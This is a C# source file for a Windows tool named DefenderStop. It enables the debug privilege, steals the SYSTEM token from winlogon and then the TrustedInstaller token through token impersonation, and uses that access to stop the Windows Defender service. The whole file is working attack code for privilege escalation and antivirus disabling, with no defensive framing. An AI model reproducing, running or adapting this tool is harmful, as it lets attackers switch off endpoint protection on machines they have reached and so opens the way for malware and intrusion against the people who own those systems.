using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DefenderStop
{
    internal class Program
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public extern static bool CloseHandle(IntPtr handle);
        [DllImport("advapi32.dll", SetLastError = true)]

        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();


        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const UInt32 TOKEN_DUPLICATE = 0x0002;
        public const UInt32 TOKEN_IMPERSONATE = 0x0004;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
            TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
            TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
            TOKEN_ADJUST_SESSIONID);


        [Flags]
        public enum SERVICE_ACCESS : uint
        {
            STANDARD_RIGHTS_REQUIRED = 0xF0000,
            SERVICE_QUERY_CONFIG = 0x00001,
            SERVICE_CHANGE_CONFIG = 0x00002,
            SERVICE_QUERY_STATUS = 0x00004,
            SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
            SERVICE_START = 0x00010,
            SERVICE_STOP = 0x00020,
            SERVICE_PAUSE_CONTINUE = 0x00040,
            SERVICE_INTERROGATE = 0x00080,
            SERVICE_USER_DEFINED_CONTROL = 0x00100,
            SERVICE_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                              SERVICE_QUERY_CONFIG |
                              SERVICE_CHANGE_CONFIG |
                              SERVICE_QUERY_STATUS |
                              SERVICE_ENUMERATE_DEPENDENTS |
                              SERVICE_START |
                              SERVICE_STOP |
                              SERVICE_PAUSE_CONTINUE |
                              SERVICE_INTERROGATE |
                              SERVICE_USER_DEFINED_CONTROL)
        }
        [Flags]
        public enum SERVICE_CONTROL : uint
        {
            STOP = 0x00000001,
            PAUSE = 0x00000002,
            CONTINUE = 0x00000003,
            INTERROGATE = 0x00000004,
            SHUTDOWN = 0x00000005,
            PARAMCHANGE = 0x00000006,
            NETBINDADD = 0x00000007,
            NETBINDREMOVE = 0x00000008,
            NETBINDENABLE = 0x00000009,
            NETBINDDISABLE = 0x0000000A,
            DEVICEEVENT = 0x0000000B,
            HARDWAREPROFILECHANGE = 0x0000000C,
            POWEREVENT = 0x0000000D,
            SESSIONCHANGE = 0x0000000E
        }

        public enum SERVICE_STATE : uint
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007
        }

        [Flags]
        public enum SERVICE_ACCEPT : uint
        {
            STOP = 0x00000001,
            PAUSE_CONTINUE = 0x00000002,
            SHUTDOWN = 0x00000004,
            PARAMCHANGE = 0x00000008,
            NETBINDCHANGE = 0x00000010,
            HARDWAREPROFILECHANGE = 0x00000020,
            POWEREVENT = 0x00000040,
            SESSIONCHANGE = 0x00000080,
        }
        public enum PrivilegeNames
        {
            SeCreateTokenPrivilege,
            SeAssignPrimaryTokenPrivilege,
            SeLockMemoryPrivilege,
            SeIncreaseQuotaPrivilege,
            SeUnsolicitedInputPrivilege,
            SeMachineAccountPrivilege,
            SeTcbPrivilege,
            SeSecurityPrivilege,
            SeTakeOwnershipPrivilege,
            SeLoadDriverPrivilege,
            SeSystemProfilePrivilege,
            SeSystemtimePrivilege,
            SeProfileSingleProcessPrivilege,
            SeIncreaseBasePriorityPrivilege,
            SeCreatePagefilePrivilege,
            SeCreatePermanentPrivilege,
            SeBackupPrivilege,
            SeRestorePrivilege,
            SeShutdownPrivilege,
            SeDebugPrivilege,
            SeAuditPrivilege,
            SeSystemEnvironmentPrivilege,
            SeChangeNotifyPrivilege,
            SeRemoteShutdownPrivilege,
            SeUndockPrivilege,
            SeSyncAgentPrivilege,
            SeEnableDelegationPrivilege,
            SeManageVolumePrivilege,
            SeImpersonatePrivilege,
            SeCreateGlobalPrivilege,
            SeTrustedCredManAccessPrivilege,
            SeRelabelPrivilege,
            SeIncreaseWorkingSetPrivilege,
            SeTimeZonePrivilege,
            SeCreateSymbolicLinkPrivilege
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SERVICE_STATUS
        {
            public int serviceType;
            public int currentState;
            public int controlsAccepted;
            public int win32ExitCode;
            public int serviceSpecificExitCode;
            public int checkPoint;
            public int waitHint;
        }

        const Int32 ANYSIZE_ARRAY = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public uint HighPart;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }
        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        static void Get_username()
        {
            StringBuilder Buffer = new StringBuilder(64);
            int nSize = 64;
            GetUserName(Buffer, ref nSize);
            Console.WriteLine(Buffer.ToString());
        }

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        // establishes a connection to the service control manager on the specified computer
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
        [DllImport("advapi32.dll", EntryPoint = "OpenServiceA", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ControlService(IntPtr hService, SERVICE_CONTROL dwControl, ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll")]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 Zero, IntPtr Null1, IntPtr Null2);
        static void Start_trustedinstaller_service()
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            Console.WriteLine("Handle to scmmanager: " + SCMHandle.ToString("X"));
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenSCManager failed!");
                return;
            }
            Console.WriteLine("OpenSCManager success!");
            string ServiceName = "TrustedInstaller";
            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint)SERVICE_ACCESS.SERVICE_START);
            Console.WriteLine("Handle to schService: " + schService.ToString("X"));
            bool bResult = StartService(schService, 0, null);
            if (bResult)
            {
                Console.WriteLine("TrustedInstaller service started!");
            }
            else
            {
                Console.WriteLine("TrustedInstaller service cannot be started!");
            }

            Thread.Sleep(2000);
            CloseHandle(schService);
            CloseHandle(SCMHandle);

        }

        public static bool EnableDebugPrivilege()
        {
            IntPtr hToken;
            bool res = OpenProcessToken(GetCurrentProcess(), 0x0020, out hToken);
            if (!res)
            {
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            LUID_AND_ATTRIBUTES luid_attrib = new LUID_AND_ATTRIBUTES();
            string t = string.Empty;
            res = LookupPrivilegeValue(t, "SeDebugPrivilege", ref luid_attrib.Luid);
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = (UInt32)0x00000002;
            tp.Privileges[0].Luid = luid_attrib.Luid;
            if (!res)
            {
                return false;
            }

            res = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            if (!res)
            {
                return false;
            }
            else
            {
                return true;
            }

        }
        static void Escalate_to_system()
        {
            //check if SE_DEBUG_Privilege is enabled


            //impersonate using winlogon.exe SYSTEM token
            Process[] processlist = Process.GetProcesses();
            IntPtr tokenHandle = IntPtr.Zero;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "winlogon")
                {
                    bool token = OpenProcessToken(theProcess.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
                    if (!token)
                    {
                        Console.WriteLine("OpenProcessToken Failed!");
                        return;
                    }
                    else
                    {
                        token = ImpersonateLoggedOnUser(tokenHandle);
                        Console.Write("User after impersonation: ");
                        Get_username();
                        Escalate_to_trustedinstaller();
                    }
                    CloseHandle(theProcess.Handle);
                }
            }
            CloseHandle(tokenHandle);

        }

        static void Escalate_to_trustedinstaller()
        {
            //impersonate using trustedintaller.exe token
            Process[] processlist = Process.GetProcesses();
            IntPtr tokenHandle = IntPtr.Zero;
            foreach (Process theProcess in processlist)
            {
                if (theProcess.ProcessName == "TrustedInstaller")
                {
                    bool token = OpenProcessToken(theProcess.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
                    if (!token)
                    {
                        Console.WriteLine("OpenProcessToken Failed!");
                        return;
                    }
                    else
                    {
                        token = ImpersonateLoggedOnUser(tokenHandle);
                        Console.Write("User after impersonation: ");
                        Get_username();
                        Stop_defender_service();
                    }
                    CloseHandle(theProcess.Handle);
                }
            }
            CloseHandle(tokenHandle);

        }

        static void Stop_defender_service()
        {
            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
            Console.WriteLine("Handle to scmmanager: " + SCMHandle.ToString("X"));
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("OpenSCManager failed!");
                return;
            }
            Console.WriteLine("OpenSCManager success!");
            string ServiceName = "WinDefend";
            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint)(SERVICE_ACCESS.SERVICE_STOP | SERVICE_ACCESS.SERVICE_QUERY_STATUS | SERVICE_ACCESS.SERVICE_ENUMERATE_DEPENDENTS));
            Console.WriteLine("Handle to schService: " + schService.ToString("X"));
            SERVICE_STATUS ssp = new SERVICE_STATUS();
            bool bResult = ControlService(schService, SERVICE_CONTROL.STOP, ref ssp);
            if (bResult)
            {
                Console.WriteLine("Windefender service stopped!");
            }
            else
            {
                Console.WriteLine("Windefender service cannot be stopped!");
            }

            Thread.Sleep(2000);
            CloseHandle(schService);
            CloseHandle(SCMHandle);


        }


        static void Main()
        {
            bool res = EnableDebugPrivilege();
            if (!res)
            {
                Console.WriteLine("SeDebugPrivilege failed");
                Environment.Exit(1);
            }
            Console.Write("Original user:");
            Get_username();
            Start_trustedinstaller_service();
            Escalate_to_system();
        }
    }
}